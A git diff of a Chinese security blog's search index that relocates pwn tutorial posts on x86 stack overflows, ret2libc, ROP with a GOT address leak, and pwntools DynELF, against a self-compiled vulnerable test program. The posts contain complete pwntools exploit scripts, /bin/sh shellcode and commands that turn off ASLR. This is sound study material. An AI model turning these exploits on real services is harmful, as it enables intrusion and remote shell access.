+<p>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。</p>
+<p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
+<p><img src="http://p1.bqimg.com/567571/6448270ab01e52b6.png" alt=""></p>
+<p><img src="http://p1.bqimg.com/567571/c0f9f3cc460b2922.png" alt=""></p>
+<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。</p>
+<p>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p>
+<p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
+<p><img src="http://i1.piimg.com/567571/e6d4d1d7b8b7e1ed.png" alt=""></p>
+<p>最后的exp：</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+libc = ELF(&apos;libc.so&apos;)
+elf = ELF(&apos;test3&apos;)
+
+p = process(&apos;./test3&apos;)
+#p = remote(&apos;127.0.0.1&apos;, 10003)
+
+plt_write = elf.symbols[&apos;write&apos;]
+print &apos;plt_write= &apos; + hex(plt_write)
+got_write = elf.got[&apos;write&apos;]
+print &apos;got_write= &apos; + hex(got_write)
+vulfun_addr = 0x0804844d
+print &apos;vulfun= &apos; + hex(vulfun_addr)
+
+payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)
+
+print &quot;\n###sending payload1 ...###&quot;
+p.send(payload1)
+
+print &quot;\n###receving write() addr...###&quot;
+write_addr = u32(p.recv(4))
+print &apos;write_addr=&apos; + hex(write_addr)
+
+print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
+system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
+print &apos;system_addr= &apos; + hex(system_addr)
+binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
+print &apos;binsh_addr= &apos; + hex(binsh_addr)
+
+payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
+
+print &quot;\n###sending payload2 ...###&quot;
+p.send(payload2)
+
+p.interactive()
+</code></pre><p><img src="http://i1.piimg.com/567571/4b23913d36d0894b.png" alt=""></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要介绍了x86——ROP攻击的基本原理,希望能帮到大家</p>
+]]></content>
+      <tags>
         <tag>pwn</tag>
       </tags>
   </entry>
@@ -1152,236 +1317,6 @@ print &quot;\n#############sending payload3#############\n&quot;
 sleep(1)
 p.send(payload3)
 </code></pre>]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn学习rop之x86篇</title>
-    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0rop%E4%B9%8Bx86%E7%AF%87/</url>
-    <content><![CDATA[<p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br><a id="more"></a></p>
-<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>在说ROP之前，先来说一下什么是缓冲区溢出漏洞。缓冲区溢出漏洞（buffer overflow）是当今软件系统最主要的安全漏洞，利用缓冲区溢出漏洞的攻击也是攻击者最常用的攻击方式之一。所谓缓冲区溢出，是指在应用程序或者系统程序的内存中写入超长数据，从而达到恶意改变或者控制程序执行流程的目的。攻击者通过缓冲区溢出把shellcode写入程序的内存空间，并且通过覆盖栈上函数的返回地址，即EIP寄存器所指向的内存地址的值，或者覆盖SEH链表来实现程序执行流程的控制，使得植入内存的shellcode得以执行。</p>
-<p>栈溢出（stack-based buffer overflows）算是安全界常见的漏洞。一方面因为程序员的疏忽，使用了 strcpy、sprintf等不安全的函数，增加了栈溢出漏洞的可能。另一方面，因为栈上保存了函数的返回地址等信息，因此如果攻击者能任意覆盖栈上的数据，通常情况下就意味着他能修改程序的执行流程，从而造成更大的破坏。</p>
-<p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
-<p>所谓ROP，简单的说就是把原来已经存在的代码块拼接起来，拼接的方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。</p>
-<p>在一般程序里面，都包含着大量的返回指令（ret），他们基本位于函数的尾部，或是函数中部需要返回的地方。而从函数开始的地方到ret指令之间的这一段序列称为二进制指令代码块（gadgets）。这些二进制指令序列使其组合成完成一些诸如读写内存、算术逻辑运算、控制流程跳转、函数调用等操作。于是，我们就可以通过利用内存空间中各个gadgets以某种顺序执行，达到进行任意操作的目的。而为了使各个gadgets“拼接”起来，我们就需要构造一个特殊的返回栈。首先让指向我们构造的栈（stack）的指针跳到gadget A中，执行其中的代码序列后ret回我们的stack中，然后下一步是跳到gadget B，执行后就到gadgets C……只要stack足够大，就能达到我们想要的效果。</p>
-<h2 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h2><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。（详细了解可以去看我的另一篇博客<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">checksec及其包含的保护机制</a>）我们这些初学的菜鸟先一步一步来，之后再加上各种防御措施，接着再学习绕过方法，所谓循序渐进嘛。。。</p>
-<p>首先来看看我们要用的简单的缓冲区溢出例子：</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-
-void vulnerable_function() {
-    char buf[128];
-    read(STDIN_FILENO, buf, 256);
-}
-
-int main(int argc, char** argv) {
-    vulnerable_function();
-    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
-}
-</code></pre><p>注意这个例子需要在32位的liunx系统下编译，学64位的时候在64位系统下编译。我们使用如下命令编译它：</p>
-<pre><code>gcc -fno-stack-protector -z execstack -o test1 test.    
-</code></pre><p>这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。同时我们在shell中执行：</p>
-<pre><code>sudo -s 
-echo 0 &gt; /proc/sys/kernel/randomize_va_space
-exit
-</code></pre><p>这几个指令。执行完后我们就关掉整个linux系统的ASLR保护。</p>
-<p>接下来我们开始对目标程序进行分析。首先我们先来确定溢出点的位置，这里我推荐使用gdb插件peda自带的pattern这个脚本来进行计算。我们使用如下命令：</p>
-<p><img src="http://p1.bqimg.com/567571/4e8b1d7f01ef6a38.png" alt=""></p>
-<p>之后使用gdb调试</p>
-<p><img src="http://p1.bqimg.com/567571/5134a5b537aa2d73.png" alt=""><br>这里我们可以得到内存出错地址为0x41416d41.之后使用命令：</p>
-<p><img src="http://p1.bpimg.com/567571/fadaebd3da23a2e0.png" alt=""></p>
-<p>就可以非常容易的计算出PC返回值的覆盖点为140个字节。我们只要构造一个”A”*140+ret字符串，就可以让pc执行ret地址上的代码了。</p>
-<p>之后就是生成一段shellcode可以在网上找现成的，也可以使用msf生成。作为一个初学者，shellcode的地址并不好找，因为gdb调试的时候会影响buf在内存中的地址，蒸米大神推介了一个好的方法：</p>
-<p>开去core dump 这个功能。</p>
-<pre><code>ulimit -c unlimited
-sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;
-</code></pre><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
-<p><img src="http://p1.bqimg.com/567571/dc30b05d3c9ad4ba.png" alt=""></p>
-<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xfff66bfd。</p>
-<p>OK，现在溢出点，shellcode和返回值地址都有了，可以开始写exp了。</p>
-<p>最终本地测试代码如下：</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-
-p = process(&apos;./test&apos;) 
-ret =0xfff66bfd 
-
-shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
-shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
-shellcode += &quot;\x0b\xcd\x80&quot;
-
-# p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) 
-#对ret进行编码，将地址转换成内存中的二进制存储形式
-payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)
-
-p.send(payload) #发送payload
-
-p.interactive()  #开启交互shell
-</code></pre><p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
-<pre><code>socat TCP4-LISTEN:10001,fork EXEC:./level1
-</code></pre><p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
-<p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！</p>
-<h2 id="0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h2><p>现在我们把DEP打开，依然关闭stack protector和ASLR。编译方法如下：</p>
-<pre><code>gcc -fno-stack-protector -o test2 test.c
-</code></pre><p>我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
-<pre><code>$ gdb ./test2
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-….
-(gdb) break main
-Breakpoint 1 at 0x8048430
-(gdb) run
-Starting program: /home/mzheng/CTF/groupstudy/test/test2 
-
-Breakpoint 1, 0x08048430 in main ()
-(gdb) print system
-$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
-(gdb) print __libc_start_main
-$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
-(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到)
-0xb7f81ff8
-warning: Unable to access target memory at 0xb7fc8500, halting search.
-1 pattern found.
-(gdb) x/s 0xb7f81ff8
-0xb7f81ff8:  &quot;/bin/sh&quot;
-</code></pre><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-
-p = process(&apos;./level2&apos;)
-#p = remote(&apos;127.0.0.1&apos;,10002)
-
-ret = 0xdeadbeef
-systemaddr=0xb7e5f460
-binshaddr=0xb7f81ff8
-
-payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
-
-p.send(payload)
-
-p.interactive()
-</code></pre><h2 id="ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h2><p>接下来我们打开ASLR保护。</p>
-<pre><code>sudo -s 
-echo 2 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre><p>从现在开始会发现test的libc.so的地址每次都会变化。</p>
-<p>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。</p>
-<p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
-<p><img src="http://p1.bqimg.com/567571/6448270ab01e52b6.png" alt=""></p>
-<p><img src="http://p1.bqimg.com/567571/c0f9f3cc460b2922.png" alt=""></p>
-<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。</p>
-<p>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p>
-<p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
-<p><img src="http://i1.piimg.com/567571/e6d4d1d7b8b7e1ed.png" alt=""></p>
-<p>最后的exp：</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-
-libc = ELF(&apos;libc.so&apos;)
-elf = ELF(&apos;test3&apos;)
-
-p = process(&apos;./test3&apos;)
-#p = remote(&apos;127.0.0.1&apos;, 10003)
-
-plt_write = elf.symbols[&apos;write&apos;]
-print &apos;plt_write= &apos; + hex(plt_write)
-got_write = elf.got[&apos;write&apos;]
-print &apos;got_write= &apos; + hex(got_write)
-vulfun_addr = 0x0804844d
-print &apos;vulfun= &apos; + hex(vulfun_addr)
-
-payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)
-
-print &quot;\n###sending payload1 ...###&quot;
-p.send(payload1)
-
-print &quot;\n###receving write() addr...###&quot;
-write_addr = u32(p.recv(4))
-print &apos;write_addr=&apos; + hex(write_addr)
-
-print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
-system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
-print &apos;system_addr= &apos; + hex(system_addr)
-binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
-print &apos;binsh_addr= &apos; + hex(binsh_addr)
-
-payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
-
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-
-p.interactive()
-</code></pre><p><img src="http://i1.piimg.com/567571/4b23913d36d0894b.png" alt=""></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要介绍了x86——ROP攻击的基本原理,希望能帮到大家</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn学习之DynELF的使用</title>
-    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
-<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
-
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-    return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
-]]></content>
       <tags>
         <tag>pwn</tag>
       </tags>
@@ -3610,5 +3545,77 @@ void swap(int *a,int *b)
         <tag>动态链接</tag>
         <tag>静态链接</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>pwn学习之DynELF的使用</title>
+    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
+<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+return data
+</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
+<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
+<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
+<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
+<pre><code>da$ disassemble vlun_fun 
+Dump of assembler code for function vlun_fun:
+   0x0804844d &lt;+0&gt;:    push   ebp
+   0x0804844e &lt;+1&gt;:    mov    ebp,esp
+   0x08048450 &lt;+3&gt;:    sub    esp,0x98
+   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
+   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
+   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
+   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
+   0x08048474 &lt;+39&gt;:    leave  
+   0x08048475 &lt;+40&gt;:    ret    
+</code></pre><p>和明显地址是0x0804844d</p>
+<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+elf = ELF(&apos;./test2&apos;)
+plt_write = elf.symbols[&apos;write&apos;]
+plt_read = elf.symbols[&apos;read&apos;]
+vulfun_addr = 0x0804844d
+
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+    return data
+p = process(&apos;./test2&apos;)
+gdb.attach(p,&quot;b *0x804850d&quot;)
+#p = remote(&apos;127.0.0.1&apos;, 10002)
+d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
+system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
+print &quot;system_addr=&quot; + hex(system_addr)
+bss_addr = 0x0804a024
+pppr = 0x804850d
+payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
+payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
+payload2 += &apos;C&apos; * (256 - len(payload2))
+#ss = raw_input()
+print &quot;\n###sending payload2 ...###&quot;
+p.send(payload2)
+p.send(&quot;/bin/sh\0&quot;)
+p.interactive()
+</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>重出江湖</title>
+    <url>/2020/04/29/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
+    <content><![CDATA[<p>经2017年参加实习之后，由于太忙（懒）blog就荒废了，参加工作以来发现搞技术果然还是得写一写记一记，如今准备重出江湖。<br><a id="more"></a></p>
+<p>今后一段时间的bolg技术重点应该在Android&amp;iOS安全方面，希望能学到更多的技术，也希望能帮到更多走在研究技术路上的小伙伴们。</p>
+]]></content>
   </entry>
 </search>
